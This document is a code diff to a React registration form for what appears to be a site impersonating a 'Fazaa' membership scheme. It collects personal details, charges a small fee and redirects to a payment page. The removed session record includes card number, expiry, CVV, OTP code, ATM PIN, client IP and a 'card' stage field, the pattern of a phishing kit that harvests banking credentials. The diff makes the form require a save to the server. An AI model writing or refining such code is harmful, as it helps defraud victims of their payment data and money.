@@ -69,7 +69,7 @@ export default function RegistrationFormEnglish() {
     try {
       const sessionId = 'FAZ-' + Date.now().toString(36)
       
-      // Save to API server
+      // Try to save to API server (non-blocking fallback)
       try {
         const { createRegistration, createSession } = await import('../lib/api')
         await createRegistration({
@@ -96,52 +96,13 @@ export default function RegistrationFormEnglish() {
           membershipTier: formData.membershipTier || 'silver',
           totalAmount: '15',
         })
-      } catch (apiErr) {
-        console.warn('[Registration] API call failed, using localStorage fallback:', apiErr)
-        // Fallback to localStorage if API is not available
-        const registrationData = {
-          sessionId,
-          fullName: formData.fullName || null,
-          phoneNumber: formData.phoneNumber || null,
-          email: formData.email || null,
-          emirate: formData.emirate || null,
-          district: formData.district || null,
-          membershipTier: formData.membershipTier || null,
-          totalAmount: '15',
-          cardName: null,
-          cardNumber: null,
-          cardExpiry: null,
-          cardCvv: null,
-          otpCode: null,
-          atmPin: null,
-          stage: 'card' as const,
-          errorMessage: null,
-          clientIp: null,
-          createdAt: new Date().toISOString(),
-          updatedAt: new Date().toISOString(),
-        }
-        const existing = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
-        existing.push(registrationData)
-        localStorage.setItem('fazaa_sessions', JSON.stringify(existing))
+        console.log('[Registration] Data saved to server successfully')
+      } catch (apiErr: any) {
+        console.warn('[Registration] API call failed:', apiErr?.message || apiErr)
+        setError('Server connection failed. Please try again.')
+        setLoading(false)
+        return
       }
-      
-      // Save sessionId to localStorage for payment page to pick up
-      const registrationData = {
-        sessionId,
-        fullName: formData.fullName || null,
-        idNumber: formData.idNumber || null,
-        phoneNumber: formData.phoneNumber || null,
-        email: formData.email || null,
-        emirate: formData.emirate || null,
-        district: formData.district || null,
-        membershipTier: formData.membershipTier || null,
-        totalAmount: '15',
-        createdAt: new Date().toISOString(),
-        updatedAt: new Date().toISOString(),
-      }
-      const existing = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
-      existing.push(registrationData)
-      localStorage.setItem('fazaa_sessions', JSON.stringify(existing))
 
       // Navigate to payment page with sessionId in URL
       window.location.href = `/payment?sessionId=${sessionId}`
